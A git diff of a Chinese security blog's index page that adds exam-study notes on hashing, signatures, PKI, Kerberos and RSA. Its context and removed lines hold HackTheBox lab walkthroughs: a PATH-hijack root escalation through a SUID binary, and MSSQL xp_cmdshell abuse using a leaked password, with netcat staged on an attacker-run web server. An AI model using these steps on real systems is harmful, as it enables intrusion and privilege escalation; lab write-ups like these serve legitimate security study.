@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-count">103</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -208,6 +208,357 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/17/%E5%93%88%E5%B8%8C-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6-%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/17/%E5%93%88%E5%B8%8C-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6-%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/" class="post-title-link" itemprop="url">哈希+数字证书+数字签名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-17 22:15:25 / 修改时间：22:18:27" itemprop="dateCreated datePublished" datetime="2026-08-17T22:15:25+08:00">2026-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="哈希-Hash-散列函数-消息摘要"><a href="#哈希-Hash-散列函数-消息摘要" class="headerlink" title="哈希 Hash 散列函数 消息摘要"></a>哈希 Hash 散列函数 消息摘要</h2><p>常见哈希算法有MD5、SHA、SM3（国密）；</p>
+<p>将任意长度的一段数据经过一道计算，转换为一段定长的数据（MD5 128位，SHA 160位，SM3 256位）：</p>
+<ol>
+<li>不可逆性（单向）：几乎无法通过hash结果推导出原文，无法通过x的哈希值推导出x；</li>
+<li>无碰撞性：几乎没可能找到一个y使y的hash值等于x的hash值；</li>
+<li>雪崩效应：输入发生轻微变化，hash输出会产生巨大变化（可用于校验完整性）；</li>
+</ol>
+<p>MD5：对任意长度报文进行运算，先把报文按照512位分组，最后得到128位报文摘要；</p>
+<p>SHA：对512位数据块进行复杂运行，最终产生160位散列值，比MD5更安全更慢；</p>
+<p>SM3：分组512位，输出杂凑256位；</p>
+<p>Hash三大应用：文件完整性校验、账户密码加密存储、用户身份认证。</p>
+<p>账户密码存储方式：</p>
+<ol>
+<li>明文存储，无安全防护；</li>
+<li>哈希存储，容易受到彩虹表攻击；</li>
+<li>哈希+盐存储，彩虹表攻击无效，盐（账户注册时间或者加上其他随机数一起生成）；</li>
+</ol>
+<p>CHAP认证（PPP中的认证方式：PAP和CHAP）：首先A向PPPoE服务器发起认证，服务端检测有张三，返回随机数R，A接收到R后用密码+R生成哈希，发回HMAC，服务端完成对比验证，可以实现源认证+完整性校验，不需要在网络上传输真实的密码。</p>
+<p>MAC或者HMAC，消息认证码，HMAC是基于hash的消息认证码，HMAC=hash（密码+R）。</p>
+<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>签名方用自己的<strong><font style="color:#DF2A3F;">私钥进行签名</font></strong>，对方收到后，用签名方的<strong><font style="color:#DF2A3F;">公钥进行验证</font></strong>；</p>
+<p>签名的主要目的是为了防止事后否认，跟手写签名的核心理念是一样的。</p>
+<p>常见的数字签名算法（公钥加密算法）：RSA（使用较多）、SM2（国密）Rabin、ELGamel签名体制和DSS标准；</p>
+<p>数字签名用于确认发送者身份和消息完整性的一个加密消息摘要，具体特点如下：可信、不可伪造、不重新使用，签名文件不可改变，不能抵赖，能够核实发送者身份；</p>
+<p>实现基于：公钥密码体制和单向安全哈希算法，如MD5RSA；</p>
+<p>SM2算法基于椭圆曲线，RSA基于大整数因子分解问题，Elgamal和ECC椭圆曲线密码基于离散对数问题；</p>
+<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字证书是由一个可信的权威机构签署的信息集合。PKI中的X.509数字证书的内容包括：版本号、序列号、签名算法、颁发者、有效起始日期、有效终止日期、主体名称、<strong>用户公钥</strong>、<strong>CA数字签名信息</strong>等，不含加密算法标识。</p>
+<p>S/MIME采用MD5生成数字指纹，利用RSA进行数字签名，并采用3DES加密数字签名。</p>
+<p>A获取B的数字证书，利用其中的B的公钥进行加密，B收到消息后用自己的私钥进行解密。</p>
+<p>权威机构CA用自己的私钥进行签名，大家可以用CA发布的公钥去进行验证。</p>
+<p>CA提供数字证书的申请、审核、签发、查询、发布及证书吊销等全生命周期的管理服务。</p>
+<p>根据您提供的四张图片，我将其中涉及的核心知识点进行了系统化总结，涵盖 <strong>PKI 体系结构</strong>、<strong>Kerberos 认证协议</strong> 以及 <strong>数字证书与数字签名的对比</strong> 三大部分。</p>
+<h2 id="PKI（公钥基础设施）体系结构"><a href="#PKI（公钥基础设施）体系结构" class="headerlink" title="PKI（公钥基础设施）体系结构"></a>PKI（公钥基础设施）体系结构</h2><p>PKI 是一套用于管理数字证书和公钥加密的框架，主要组件及其职责如下：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>角色与功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>终端实体（用户/终端实体）</strong></td>
+<td>申请数字证书的客户，可以是个人、组织或政府机构。</td>
+</tr>
+<tr>
+<td><strong>注册机构（RA）</strong></td>
+<td>负责受理证书申请，对申请人合法性进行资格审查，决定批准或拒绝申请。<strong>RA 不签发证书</strong>，仅做身份审核；小型机构可由 CA 兼任 RA。</td>
+</tr>
+<tr>
+<td><strong>证书颁发机构（CA）</strong></td>
+<td>核心机构，负责签发、管理和撤销证书（包括颁发、续期、吊销）。</td>
+</tr>
+<tr>
+<td><strong>证书发布系统</strong></td>
+<td>负责证书的发放与分发，可通过目录服务或用户自行下载等方式。</td>
+</tr>
+<tr>
+<td><strong>CRL（证书吊销列表）库</strong></td>
+<td>存放已吊销或过期证书的列表，供验证方查询证书有效性。</td>
+</tr>
+<tr>
+<td><strong>CRL 发布者</strong></td>
+<td>负责生成并发布 CRL。</td>
+</tr>
+<tr>
+<td><strong>CRL 用户</strong></td>
+<td>需要查询 CRL 以验证证书状态的实体。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p><strong>关键点</strong>：CA 负责签发证书，RA 负责资格审查，CRL 用于证书状态查询，三者协同完成证书全生命周期管理。</p>
+</blockquote>
+<h2 id="Kerberos-认证协议"><a href="#Kerberos-认证协议" class="headerlink" title="Kerberos 认证协议"></a>Kerberos 认证协议</h2><p>Kerberos 是一个基于<strong>对称加密</strong>的网络认证协议，使用<strong>可信第三方（KDC）</strong>为客户端/服务器应用提供强身份认证。</p>
+<h3 id="1-体系结构组件"><a href="#1-体系结构组件" class="headerlink" title="1. 体系结构组件"></a>1. 体系结构组件</h3><ul>
+<li><strong>KDC（密钥分发中心）</strong>：由两个逻辑服务组成：<ul>
+<li><strong>AS（认证服务器）</strong>：负责初始身份认证，发放<strong>许可凭证（Ticket Granting Ticket, TGT）</strong>。</li>
+<li><strong>TGS（票据发放服务器）</strong>：负责为已认证用户发放访问特定服务的<strong>服务凭证（Service Ticket）</strong>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-认证流程（简略步骤）"><a href="#2-认证流程（简略步骤）" class="headerlink" title="2. 认证流程（简略步骤）"></a>2. 认证流程（简略步骤）</h3><ol>
+<li>客户端向 <strong>AS</strong> 请求许可凭证（TGT）。  </li>
+<li>AS 返回 TGT（加密的）。  </li>
+<li>客户端用 TGT 向 <strong>TGS</strong> 请求访问某服务的凭证。  </li>
+<li>TGS 返回服务凭证。  </li>
+<li>客户端将服务凭证提交给目标服务器，完成认证。</li>
+</ol>
+<h3 id="3-重要概念"><a href="#3-重要概念" class="headerlink" title="3. 重要概念"></a>3. 重要概念</h3><ul>
+<li><strong>票据（Ticket）</strong> 主要包含：<strong>客户与目的服务方的 Principal（主体名）、客户方 IP 地址、时间戳、生存期、会话密钥</strong>等。</li>
+<li>整个协议依赖对称密钥（如 DES、AES），KDC 作为可信第三方。</li>
+</ul>
+<h3 id="4-常见误区辨析（结合题干）"><a href="#4-常见误区辨析（结合题干）" class="headerlink" title="4. 常见误区辨析（结合题干）"></a>4. 常见误区辨析（结合题干）</h3><ul>
+<li><strong>错误说法</strong>：<code>认证服务器 AS 为申请服务的用户授予票据</code> —— 实际上，<strong>AS 授予的是 TGT（许可凭证）</strong>，而<strong>访问具体服务的票据由 TGS 授予</strong>。因此该说法是错误的。</li>
+</ul>
+<hr>
+<h2 id="数字证书-vs-数字签名（类比与对比）"><a href="#数字证书-vs-数字签名（类比与对比）" class="headerlink" title="数字证书 vs 数字签名（类比与对比）"></a>数字证书 vs 数字签名（类比与对比）</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>对比维度</th>
+<th><strong>数字证书</strong></th>
+<th><strong>数字签名</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>类比</strong></td>
+<td>身份证</td>
+<td>手写签名 / 按手印</td>
+</tr>
+<tr>
+<td><strong>核心作用</strong></td>
+<td><strong>验证用户/网站身份</strong>（即“你是谁”）</td>
+<td><strong>防止抵赖</strong>（不可否认性） + 验证身份（“你是否认过此内容”）</td>
+</tr>
+<tr>
+<td><strong>技术原理</strong></td>
+<td>证书中包含<strong>用户公钥</strong>，并由 <strong>CA 的私钥进行数字签名</strong>（即 CA 担保公钥的归属）。</td>
+<td>发送方使用<strong>自己的私钥</strong>对消息（或摘要）加密，接收方使用<strong>发送方的公钥</strong>进行验证。</td>
+</tr>
+<tr>
+<td><strong>典型应用场景</strong></td>
+<td>验证网站真伪（HTTPS）、加密通信、代码签名等。</td>
+<td>合同签署、电子邮件、软件发布等需要确保完整性和来源真实性的场景。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p><strong>核心差异</strong>：数字证书用于<strong>绑定身份与公钥</strong>（借助 CA 的可信背书）；数字签名用于<strong>保证数据完整性和来源可信</strong>（借助私钥签名、公钥验签）。两者常结合使用（例如证书中包含公钥，该公钥可用于验证签名）。</p>
+</blockquote>
+<h2 id="综合归纳"><a href="#综合归纳" class="headerlink" title="综合归纳"></a>综合归纳</h2><ul>
+<li><strong>PKI</strong> 提供了证书的颁发、管理和撤销机制，是数字证书可信的基础。</li>
+<li><strong>Kerberos</strong> 是另一种基于对称密钥、无需公钥体系的认证协议，适合内网环境，强调单点登录和时效性。</li>
+<li><strong>数字证书与数字签名</strong>虽都依赖非对称加密，但目的不同：证书侧重“身份绑定”，签名侧重“行为确认”。</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/17/RSA%E8%AE%A1%E7%AE%97%E4%B8%93%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/17/RSA%E8%AE%A1%E7%AE%97%E4%B8%93%E9%A2%98/" class="post-title-link" itemprop="url">RSA计算专题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-17 22:15:06 / 修改时间：22:17:02" itemprop="dateCreated datePublished" datetime="2026-08-17T22:15:06+08:00">2026-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BD%AF%E8%80%83/" itemprop="url" rel="index"><span itemprop="name">软考</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="RSA基础"><a href="#RSA基础" class="headerlink" title="RSA基础"></a>RSA基础</h2><p>目前公认的比较安全的公钥密码有两类：</p>
+<ol>
+<li>基于大素数因子分解困难性：RSA；</li>
+<li>基于离散对数问题困难性：DH、Elgamal、ECC（椭圆曲线密码）</li>
+</ol>
+<p>RSA算法中，公钥和私钥都可以用来加密消息，加密与解密使用不同密钥即可。</p>
+<p>RSA提供了一种保护网络通信和数据存储的<strong>机密性、完整性、真实性和不可否认性</strong>的方法。</p>
+<p>SSH、OpenPGP、S/MIME、SSL/TLS都依赖RSA进行加密和数字签名功能。</p>
+<h2 id="RSA计算"><a href="#RSA计算" class="headerlink" title="RSA计算"></a>RSA计算</h2><p>gcd表示求解最大公约数</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>操作</th>
+<th>是否保密</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>①</td>
+<td>随机选择两个大素数 p 和 q</td>
+<td>p 和 q 保密</td>
+</tr>
+<tr>
+<td>②</td>
+<td>计算 n = p * q</td>
+<td>n 公开</td>
+</tr>
+<tr>
+<td>③</td>
+<td>计算 phi(n) = (p-1) * (q-1)</td>
+<td>phi(n) 保密</td>
+</tr>
+<tr>
+<td>④</td>
+<td>随机选取正整数 e，满足 1 &lt; e &lt; phi(n) 且 e 与 phi(n) 的最大公约数为 1</td>
+<td>e 公开</td>
+</tr>
+<tr>
+<td>⑤</td>
+<td>根据 e * d = 1 (mod phi(n))，求出 d</td>
+<td>d 保密</td>
+</tr>
+<tr>
+<td>⑥</td>
+<td>加密运算 C = M<sup>e </sup>mod n<sup>，</sup>解密运算<sup> </sup>M = C<sup>d</sup> mod n</td>
+<td>（空）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>RSA 公钥（公开密钥）：Ke = &lt; n, e &gt;<br>RSA 私钥（保密密钥）：Kd = &lt; p, q, d, phi(n) &gt;</p>
+<p>是否可以直接使用RSA密码进行进行数字签名？</p>
+<p>不可以，需要首先做Hash，首先是保证签名完整性，其次是确保密文长度小于n，不然会产生回转，无法解密；</p>
+<p>RSA签名：真实性、完整性、不可否认性；</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1742,352 +2093,6 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; <span class="built_in">cat</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">robert@oopsie:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br><span class="line">/usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ewhfuih1234</span><br><span class="line">ewhfuih1234</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=1000(robert) <span class="built_in">groups</span>=1000(robert),1001(bugtracker)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">reports  root.txt</span><br><span class="line"><span class="built_in">head</span> root.txt</span><br></pre></td></tr></table></figure>
 <p>关于strace </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:/tmp$ strace /usr/bin/bugtracker</span><br><span class="line">strace /usr/bin/bugtracker</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/bugtracker&quot;</span>, [<span class="string">&quot;/usr/bin/bugtracker&quot;</span>], 0x7ffc91905a80 /* 24 vars */) = 0</span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">brk(NULL)                               = 0x557e55b64000</span><br><span class="line">fcntl(0, F_GETFD)                       = 0</span><br><span class="line">fcntl(1, F_GETFD)                       = 0</span><br><span class="line">fcntl(2, F_GETFD)                       = 0</span><br><span class="line">access(<span class="string">&quot;/etc/suid-debug&quot;</span>, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0644, st_size=36386, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 36386, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0753153000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\260\34\2\0\0\0\0\0&quot;</span>..., 832) = 832</span><br><span class="line">fstat(3, &#123;st_mode=S_IFREG|0755, st_size=2030544, ...&#125;) = 0</span><br><span class="line">mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0753151000</span><br><span class="line">mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f0752b44000</span><br><span class="line">mprotect(0x7f0752d2b000, 2097152, PROT_NONE) = 0</span><br><span class="line">mmap(0x7f0752f2b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f0752f2b000</span><br><span class="line">mmap(0x7f0752f31000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f0752f31000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7f0753152500) = 0</span><br><span class="line">mprotect(0x7f0752f2b000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x557e54d1b000, 4096, PROT_READ) = 0</span><br><span class="line">mprotect(0x7f075315c000, 4096, PROT_READ) = 0</span><br><span class="line">munmap(0x7f0753153000, 36386)           = 0</span><br><span class="line">fstat(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">brk(NULL)                               = 0x557e55b64000</span><br><span class="line">brk(0x557e55b85000)                     = 0x557e55b85000</span><br><span class="line">write(1, <span class="string">&quot;\n&quot;</span>, 1</span><br><span class="line">)                       = 1</span><br><span class="line">write(1, <span class="string">&quot;------------------\n&quot;</span>, 19------------------</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;: EV Bug Tracker :\n&quot;</span>, 19: EV Bug Tracker :</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;------------------\n&quot;</span>, 19------------------</span><br><span class="line">)    = 19</span><br><span class="line">write(1, <span class="string">&quot;\n&quot;</span>, 1</span><br><span class="line">)                       = 1</span><br><span class="line">fstat(0, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0</span><br><span class="line">write(1, <span class="string">&quot;Provide Bug ID: &quot;</span>, 16Provide Bug ID: )        = 16</span><br><span class="line"><span class="built_in">read</span>(0,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/kehan.jpg">
-      <meta itemprop="name" content="Aono">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aono Note">
-      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Aono Note">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier2-Archetype/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier2-Archetype</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2026-05-17 20:41:04 / 修改时间：20:43:33" itemprop="dateCreated datePublished" datetime="2026-05-17T20:41:04+08:00">2026-05-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>第二层级是“StartingPoint”中的最高层级，包含功能齐全的机器，需要用户串联多个攻击步骤才能成功入侵。用户必须进行彻底的枚举，获取初始立足点，然后逐步提升权限至 root 或系统级别。与之前的层级不同，第二层级中的每台机器都包含两个标志——一个用于用户，一个用于 root/系统——这模拟了真实的渗透测试场景，需要更全面的方法。</p>
-<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --min-rate 5000 10.129.129.122</span><br><span class="line">smbclient -L 10.129.129.122</span><br><span class="line"><span class="built_in">sudo</span> smbclient \\\\10.129.129.122\\backups</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">get prod.dtsConfig</span><br><span class="line">Password=M3g4c0rp123</span><br><span class="line"><span class="built_in">cd</span> /usr/share/doc/python3-impacket/examples/</span><br><span class="line">python mssqlclient.py -h</span><br><span class="line"><span class="built_in">sudo</span> python mssqlclient.py ARCHETYPE/sql_svc@10.129.129.122 -windows-auth</span><br><span class="line">SELECT is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c pwd&#x27;</span></span><br><span class="line">C:\Windows\system32</span><br><span class="line">wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe</span><br><span class="line">ip a</span><br><span class="line">tun0: 10.10.14.92</span><br><span class="line"><span class="built_in">sudo</span> python -m http.server 80 </span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;powershell -c cd 